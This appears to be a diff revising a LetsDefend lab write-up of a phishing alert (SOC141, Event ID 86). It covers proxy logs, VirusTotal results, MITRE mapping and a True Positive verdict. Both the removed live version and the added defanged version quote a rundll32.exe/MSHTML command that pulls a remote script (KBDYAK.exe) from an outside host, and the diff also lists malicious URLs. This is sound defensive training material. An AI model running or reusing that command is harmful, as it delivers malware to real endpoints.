@@ -2,161 +2,108 @@
 
 ## 1. Alert Summary
 
-### Alert Details
-
-
 | Field | Value |
-|---------|---------|
-| Alert ID | SOC141 |
+|---|---|
 | Event ID | 86 |
+| Detection Rule | SOC141 - Phishing URL Detected |
+| Event Time | 2021-03-22 21:23 |
+| Severity | High |
 | Category | Phishing |
 | User | ellie |
 | Hostname | EmilyComp |
 | Source IP | 172.16.17.49 |
 | Destination IP | 91.189.114.8 |
 | Destination Domain | mogagrocol.ru |
-| URL | `http://mogagrocol.ru/wp-content/plugins/akismet/fv/index.php?email=ellie@letsdefend.io` |
-
----
-
-
+| Device Action | Allowed |
+| Investigation Verdict | True Positive |
 
 ## 2. Investigation Overview
 
-### Summary
+An alert was generated after the user `ellie` accessed a suspicious URL from the endpoint `EmilyComp`.
 
+Proxy analysis confirmed communication with the phishing domain. Subsequent endpoint investigation identified suspicious `rundll32.exe` activity using the MSHTML engine to retrieve a remote script.
 
-A security alert was triggered after an internal user accessed a suspicious URL identified as a phishing domain. The investigation focused on validating the malicious URL, analyzing network activity, and investigating endpoint behavior to determine potential compromise.
-
----
-
-
+The investigation therefore extended beyond URL reputation analysis to examine possible payload retrieval and endpoint impact.
 
 ## 3. Evidence Analysis
 
-### Investigation
+### URL and Domain Analysis
 
+The observed request was:
 
-The investigation focused on proxy logs, threat intelligence analysis, and endpoint activity.
-
-### Key Findings
-
-- Suspicious phishing URL accessed by an internal endpoint
-- Domain reputation analysis showed malicious indicators
-- Proxy logs confirmed communication with the suspicious domain
-- User interaction with the phishing URL was confirmed
-- Endpoint investigation identified suspicious `rundll32.exe` execution activity
-- The attacker attempted to execute remote code and retrieve a malicious payload from external infrastructure
-
-### Suspicious Command Identified
-
-```cmd
-rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:http://ru-uid-507352920.pp.ru/KBDYAK.exe")
+```text
+hxxp://mogagrocol[.]ru/wp-content/plugins/akismet/fv/index.php?email=ellie@letsdefend[.]io
 ```
 
-The command indicates abuse of the legitimate Windows binary **rundll32.exe** to execute malicious code and retrieve the payload **KBDYAK.exe** from an external server.
+VirusTotal reported:
 
----
+| Indicator | Result |
+|---|---|
+| URL | 13/94 detections |
+| Domain | 6/93 detections |
+| Destination IP | 0/93 detections |
 
+The domain and URL were classified as suspicious or phishing-related by reputation sources.
 
 ### Network Activity
 
+Proxy logs confirmed the connection:
 
 | Field | Value |
-|---------|---------|
-| Protocol | HTTP |
-| Port | 80 |
+|---|---|
+| Source IP | 172.16.17.49 |
 | Destination IP | 91.189.114.8 |
+| Destination Port | 80 |
+| Protocol | HTTP |
+| User | ellie |
+| Host | EmilyComp |
 
-Additional malicious communication was identified involving:
+The request was recorded as Allowed.
 
-```text
-http://ru-uid-507352920.pp.ru/KBDYAK.exe
+### Endpoint Activity
+
+The investigation identified the following suspicious command:
+
+```cmd
+rundll32.exe javascript:..\mshtml,RunHTMLApplication document.write();GetObject("script:hxxp://ru-uid-507352920[.]pp[.]ru/KBDYAK.exe")
 ```
 
-The activity indicates attempted payload delivery from attacker-controlled infrastructure.
+The command abused `rundll32.exe` and the MSHTML engine to retrieve a remote script.
 
----
-
-
-### Impact Assessment
-
-
-- Successful phishing URL access
-- Malicious command execution identified
-- Attempted payload retrieval from external infrastructure
-- Likely endpoint compromise
-- Endpoint containment required to prevent further malicious activity
-
----
-
-
-### Indicators of Compromise (IOCs)
-
-
-| Type | Indicator |
-|--------|-----------|
-| Domain | mogagrocol.ru |
-| IP Address | 91.189.114.8 |
-| URL | http://mogagrocol.ru/wp-content/plugins/akismet/fv/index.php |
-| Payload | KBDYAK.exe |
-| External Resource | ru-uid-507352920.pp.ru |
-
----
+The available endpoint evidence supports suspicious command execution and attempted payload retrieval. It does not independently establish successful execution of `KBDYAK.exe`.
 
 ### External References
 
-Public sources used for contextual cross-checking. Their findings are not attributed to this lab investigation unless independently corroborated.
+- [Independent EventID 86 investigation](https://www.policytopackets.com/writeups/letsdefend/soc/141_86/)
+- [SOC141 endpoint investigation](https://abby-exe.github.io/letsdefend/2026/02/27/soc141.html)
 
-- [Independent EventID 86 write-up](https://www.policytopackets.com/writeups/letsdefend/soc/141_86/)
+The independent endpoint investigation also describes Emotet-related activity associated with the suspicious URL and `rundll32.exe`.
 
 ## 4. MITRE ATT&CK Mapping
 
-
-| Technique | Description |
-|------------|------------|
-| T1566 | Phishing |
-| T1204 | User Execution |
-| T1218.011 | System Binary Proxy Execution: Rundll32 |
-| T1105 | Ingress Tool Transfer |
-
----
-
-
+| Technique | Name | Supporting Evidence |
+|---|---|---|
+| T1204.001 | User Execution: Malicious Link | User accessed the phishing URL |
+| T1218.011 | System Binary Proxy Execution: Rundll32 | `rundll32.exe` used with MSHTML |
+| T1105 | Ingress Tool Transfer | Attempted retrieval of remote content |
 
 ## 5. Response Actions
 
+- Reviewed the phishing URL and domain reputation.
+- Correlated proxy logs with endpoint information.
+- Examined the suspicious `rundll32.exe` command.
+- Identified the remote payload URL.
+- Collected the relevant domain, IP, and payload indicators.
+- Recorded endpoint isolation and malicious infrastructure blocking in the original investigation notes.
 
-- Classified alert as True Positive
-- Isolated the affected endpoint
-- Blocked malicious domains and IP addresses
-- Identified and removed malicious payloads
-- Recommended additional forensic analysis
-- Monitored the environment for related indicators
-
----
-
-
+Further forensic review is necessary to establish whether the retrieved payload completed execution.
 
 ## 6. Conclusion
 
+The investigation confirmed a **True Positive** phishing URL incident involving access to `mogagrocol.ru` and suspicious `rundll32.exe` activity.
 
-This investigation identified a phishing attack in which a user accessed a malicious URL, leading to attempted code execution through the abuse of **rundll32.exe**.
+Endpoint evidence identified an attempted retrieval of `KBDYAK.exe` through the MSHTML engine. Successful execution of that payload was not independently established in the available material.
 
-Analysis revealed suspicious command execution and attempted retrieval of the malicious payload **KBDYAK.exe** from attacker-controlled infrastructure.
+**Final Verdict: True Positive**
 
-Based on the collected evidence, the alert was classified as a **True Positive** and required endpoint containment and additional investigation.
-
-###  Final Verdict
-
-**True Positive**
-
-###  Classification
-
-**Phishing / Malicious URL**
-
----
-
-⭐ SOC investigation completed following the workflow:
-
-**Detection → Analysis → Impact Assessment → Response**
+**Classification: Phishing URL / Suspicious Rundll32 Activity**
